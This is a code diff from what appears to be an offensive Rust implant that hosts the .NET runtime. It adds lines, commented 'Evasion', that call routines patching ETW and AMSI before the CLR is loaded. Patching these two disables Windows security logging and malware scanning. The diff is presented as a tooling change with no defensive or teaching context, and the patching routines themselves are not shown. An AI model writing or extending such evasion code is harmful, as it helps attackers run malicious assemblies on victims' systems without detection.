@@ -133,6 +133,10 @@ impl ClrHost {
             type FnCLRCreateInstance = unsafe extern "system" fn(*const GUID, *const GUID, *mut *mut c_void) -> i32;
             let clr_create_instance: FnCLRCreateInstance = core::mem::transmute(clr_create_instance_addr);
 
+            // Evasion: Patch ETW and AMSI before loading CLR
+            let _ = crate::modules::patch::patch_etw();
+            let _ = crate::modules::patch::patch_amsi();
+
             let mut meta_host: *mut ICLRMetaHost = core::ptr::null_mut();
             if clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &mut meta_host as *mut _ as *mut *mut c_void) < 0 {
                 return Err(());
